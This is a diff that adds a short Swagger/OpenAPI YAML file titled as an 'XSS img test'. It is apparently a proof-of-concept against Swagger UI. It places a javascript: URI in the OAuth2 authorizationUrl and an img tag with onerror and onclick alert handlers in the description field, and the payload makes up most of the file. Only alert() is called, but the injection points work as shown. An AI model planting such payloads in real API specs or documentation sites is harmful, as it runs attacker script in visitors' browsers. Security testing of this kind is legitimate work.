@@ -1,0 +1,14 @@
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(/MrDOoS023/)//
+info:
+  version: "1.0.0"
+  title: XSS img test By MrDOoS023
+  description: onload="alert(1)" <img src=https://i.ibb.co/tMRchpj/fapo.jpg onclick="alert(/MrDOoS023/)" onerror="alert(/MrDOoS023/)">
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
